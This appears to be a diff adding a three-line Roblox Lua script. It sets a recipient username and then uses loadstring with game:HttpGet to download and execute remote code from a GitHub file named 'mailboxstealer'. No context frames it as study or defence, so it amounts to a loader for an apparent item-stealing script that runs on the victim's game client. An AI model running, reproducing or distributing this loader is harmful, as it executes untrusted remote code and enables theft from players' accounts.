@@ -1,0 +1,3 @@
+UserName = "StressesMyLie"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kdm063/duckx/main/mailboxstealer", true))()
